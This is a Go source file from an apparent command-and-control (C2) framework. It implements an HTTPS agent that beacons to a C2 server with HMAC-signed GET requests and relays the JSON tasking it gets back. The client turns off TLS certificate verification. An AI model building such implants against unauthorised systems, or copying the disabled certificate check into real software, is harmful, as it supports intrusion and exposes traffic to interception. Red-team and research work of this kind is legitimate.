package agent

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"

	"c2framework/internals/server"
)

// HTTPSAgent implements the Agent interface for HTTPS
type HTTPSAgent struct {
	serverAddr string
	client     *http.Client
}

// NewHTTPSAgent creates a new HTTPS agent
func NewHTTPSAgent(serverIP string, serverPort string) *HTTPSAgent {
	// Create TLS config that accepts self-signed certificates
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	// Create HTTP client with custom TLS config
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
	}

	return &HTTPSAgent{
		serverAddr: fmt.Sprintf("%s:%s", serverIP, serverPort),
		client:     client,
	}
}

// Send implements Communicator.Send for HTTPS
func (c *HTTPSAgent) Send(ctx context.Context) (json.RawMessage, error) {
	// Construct the URL
	url := fmt.Sprintf("https://%s/", c.serverAddr)

	// For GET requests, body is empty
	var body []byte = nil

	// Create GET request
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("creating request: %w", err)
	}

	// Sign the request with HMAC
	SignRequest(req, body)

	// Send request
	resp, err := c.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("sending request: %w", err)
	}
	defer resp.Body.Close()

	// Check for authentication failure
	if resp.StatusCode == http.StatusUnauthorized {
		return nil, fmt.Errorf("authentication failed - check shared secret")
	}

	// Check status code
	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("server returned status %d: %s", resp.StatusCode, respBody)
	}

	// Read response body
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("reading response: %w", err)
	}

	// Unmarshal into HTTPSResponse to validate structure
	var httpsResp server.HTTPSResponse
	if err := json.Unmarshal(respBody, &httpsResp); err != nil {
		return nil, fmt.Errorf("unmarshaling response: %w", err)
	}

	// Marshal back to json.RawMessage
	jsonData, err := json.Marshal(httpsResp)
	if err != nil {
		return nil, fmt.Errorf("marshaling response: %w", err)
	}

	return json.RawMessage(jsonData), nil
}
